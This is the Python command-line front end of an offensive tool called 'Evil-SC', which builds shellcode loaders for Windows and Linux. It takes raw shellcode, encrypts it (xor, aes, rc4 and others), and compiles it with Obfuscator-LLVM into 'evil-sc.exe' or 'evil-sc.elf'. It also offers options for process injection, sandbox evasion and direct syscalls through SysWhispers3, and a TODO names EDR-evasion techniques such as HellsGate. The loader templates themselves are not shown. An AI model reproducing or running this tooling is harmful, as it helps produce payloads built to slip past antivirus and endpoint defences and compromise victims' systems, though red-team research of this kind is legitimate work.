import argparse
import os
from colorama import init, Fore
from core.utils.CustomArgFormatter import CustomArgFormatter
from core.controlers.TemplateLoader import TemplateLoader


def banner():
    init(autoreset=True)

    ascii_art = f"""
    {Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗   {Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗      {Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║      {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}╔════╝
    {Fore.CYAN}█████{Fore.GREEN}╗  {Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}█████{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}██{Fore.GREEN}╔══╝  ╚{Fore.CYAN}██{Fore.GREEN}╗ {Fore.CYAN}██{Fore.GREEN}╔╝{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║╚════╝╚════{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}███████{Fore.GREEN}╗ ╚{Fore.CYAN}████{Fore.GREEN}╔╝ {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}███████{Fore.GREEN}║╚{Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.GREEN}╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
    {Fore.CYAN}                                             @v4resk                         
    """

    print(ascii_art)



class esc:
    def __init__(self):
        self.target_process = ""
        self.shellcode_variable = ""
        self.syscall_method = ""
        self.syswhispers_recovery_method = ""
        self.method = ""
        self.encoders = []
        self.encryptors = []
        self.sandbox_evasion = []
        self.evil_sc_template_file = ""
        self.outfile = ""
        self.llvmo = False

        self.valid_encryptors = ["base64","xor","nop","aes","des3","rc4","uuid"]


    def parse_arguments(self):
        # Create the main argument parser
        parser = argparse.ArgumentParser(description='Template-based shellcode loader', formatter_class=CustomArgFormatter)

        # Create subparsers for different platforms
        subparsers = parser.add_subparsers(dest='platform', required=True, help='Module to be used')

        # Windows subparser
        win_parser = subparsers.add_parser('windows', help='Shellcode loader for Windows platform')
        win_parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the raw shellcode file')

        win_parser.add_argument('-m', '--method', dest='method', required=True, choices=self.get_available_files("methods", platform="windows"),
                                help='Shellcode-loading method')

        win_parser.add_argument('-e', '--encrypt', action='append', dest='encryptors', choices=self.get_available_files("encryptors", platform="windows"),
                                help='Template-dependent encryption or encoding method to be applied to the shellcode')

        win_parser.add_argument('-l', '--llvmo', dest='llvmo', action='store_true',
                                help='Use Obfuscator-LLVM to compile')

        win_parser.add_argument('-p', '--process', dest='target_process', metavar='PROCESS_NAME', default=False,
                                help='Process name for shellcode injection')

        win_parser.add_argument('-se', '--sandbox-evasion', action='append', dest='sandbox_evasion',
                                choices=self.get_available_files("sandboxEvasion", platform="windows"),
                                help='Sandbox evasion technique')

        win_parser.add_argument('-sc', '--syscall', dest='syscall_method', default="SysWhispers3",
                                choices=["SysWhispers3", "GetSyscallStub"],
                                help='Syscall execution method for supported templates')

        win_parser.add_argument('--sw-method', dest='syswhispers_recovery_method', default="jumper_randomized",
                                choices=["embedded", "egg_hunter", "jumper", "jumper_randomized"],
                                help='Syscall execution method for supported templates')

        win_parser.add_argument('-o', '--outfile', dest='outfile', metavar='OUTPUT_FILE', default="evil-sc.exe",
                                help='Output filename')

        win_parser.add_argument('--encoder', action='append', dest='encoders', metavar='ENCODER',
                                help='Template-independent encoding method to be applied to the shellcode (default: sgn)')

        # Linux subparser (if you want to add specific options for Linux, otherwise can be omitted)
        lin_parser = subparsers.add_parser('linux', help='Shellcode loader for Linux platform')
        lin_parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the raw shellcode file')

        lin_parser.add_argument('-m', '--method', dest='method', required=True, choices=self.get_available_files("methods", platform="linux"),
                                help='Shellcode-loading method')

        lin_parser.add_argument('-e', '--encrypt', action='append', dest='encryptors', choices=self.get_available_files("encryptors", platform="linux"),
                                help='Template-dependent encryption or encoding method to be applied to the shellcode')

        lin_parser.add_argument('-l', '--llvmo', dest='llvmo', action='store_true',
                                help='Use Obfuscator-LLVM to compile')
        
        lin_parser.add_argument('-se', '--sandbox-evasion', action='append', dest='sandbox_evasion',
                                choices=self.get_available_files("sandboxEvasion", platform="linux"),
                                help='Sandbox evasion technique')

        lin_parser.add_argument('-p', '--process', dest='target_process', metavar='PROCESS_NAME', default=False,
                                help='Process name for shellcode injection')

        lin_parser.add_argument('-o', '--outfile', dest='outfile', metavar='OUTPUT_FILE', default="evil-sc.elf",
                                help='Output filename')

        lin_parser.add_argument('--encoder', action='append', dest='encoders', metavar='ENCODER',
                                help='Template-independent encoding method to be applied to the shellcode (default: sgn)')

        # Utils subparser 
        utils_parser = subparsers.add_parser('utils', help='Utility module for shellcodes')
        utils_parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the raw shellcode file')

        utils_parser.add_argument('-n', '--name', dest='name', default="shellcode",
                                help='Shellcode variable name')

        # Parse arguments
        args = parser.parse_args()

        return args

    # This method return available .cpp files in a given folder, for Menu options
    def get_available_files(self, folder, platform):
        template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder, platform)
        if not os.path.exists(template_folder):
            os.makedirs(template_folder)
        available_files = [file[:-4] for file in os.listdir(template_folder) if file.endswith('.cpp')]
        return available_files


    def run(self):
        # Parsing arguments
        args = self.parse_arguments()
        for key, value in vars(args).items():
            setattr(self, key, value)

        # TO DO
        # SandBox_evasion: Sleep, NoVMenv, 
        # EDR_Evasion: API Hash / SysWhispers2 /Indirect Syscall / HellsGate / HellHall ?

        print()

        # Debug Prints
        if self.platform == "windows" or self.platform == "linux":
            loader = TemplateLoader(vars(self))
            #loader.test()
            loader.write_code()
            loader.compile()
            print(f'{Fore.GREEN}Target OS:\t\t{Fore.WHITE}{self.platform}')
            print(f'{Fore.GREEN}Shellcode:\t\t{Fore.WHITE}{self.shellcode_variable}')
            print(f'{Fore.GREEN}Method:\t\t\t{Fore.WHITE}{os.path.basename(self.method)}')
            print(f'{Fore.GREEN}Encryptors:\t\t{Fore.WHITE}{loader.encryptors_chain.to_string()}')
            print(f'{Fore.GREEN}Sandbox Evasion:\t{Fore.WHITE}{loader.sandboxEvasion_chain.to_string()}')
            print(f'{Fore.GREEN}Syscalls :\t\t{Fore.WHITE}{loader.syscall_method}')
            print(f'{Fore.GREEN}Compiler :\t\t{Fore.WHITE}{"LLVM-Obfuscator" if loader.llvmo else "MinGW"}')
            #print(f'{Fore.GREEN}Target Process:\t\t{Fore.WHITE}{self.target_process}')
            #print(f"\n{Fore.CYAN}Genreated template:\t{Fore.WHITE}{self.evil_sc_template_file}")
            print(f"\n{Fore.CYAN}Output:\t\t\t{Fore.WHITE}{self.outfile}")
        elif self.platform == "utils":
            from core.utils.utils import file_to_bytearray,bytearray_to_cpp_sc
            print(f'{Fore.GREEN}Hex Shellcode:\t\t{Fore.WHITE}')
            print(bytearray_to_cpp_sc(file_to_bytearray(self.shellcode_variable,),method=0, sc_var_name=self.name))

            print(f'\n{Fore.GREEN}Array Shellcode:\t\t{Fore.WHITE}')
            print(bytearray_to_cpp_sc(file_to_bytearray(self.shellcode_variable,),method=1, sc_var_name=self.name))
            pass
